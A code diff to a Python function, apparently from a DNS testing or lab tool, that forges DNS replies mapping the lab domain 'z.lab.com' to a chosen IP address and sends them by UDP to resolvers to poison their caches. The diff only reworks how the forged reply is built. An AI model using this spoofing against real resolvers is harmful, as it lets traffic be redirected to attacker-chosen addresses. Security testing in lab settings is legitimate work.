@@ -183,14 +183,11 @@ def cacheposion(directory_path, config, args, hosts):
     for host in hosts:
         try:
             ip = host.split(":")[0]
-            port = host.split(":")[1]    
-            fake_response = DNSRecord(
-                DNSHeader(id=12345, qr=1, aa=1, ra=1),
-                DNSRecord.question("z.lab.com")
-            )
-            
-            a = fake_response.replyZone("z.lab.com 60 A 1.111.111.111")
-
+            port = host.split(":")[1]
+            fake_question = DNSRecord.question("z.lab.com")
+            fake_question.header.id = 12345
+            a = fake_question.replyZone("z.lab.com 60 A 1.111.111.111")
+            a.header.aa = 0
             # Send the spoofed response to the resolver
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             fake_response_packet = a.pack()
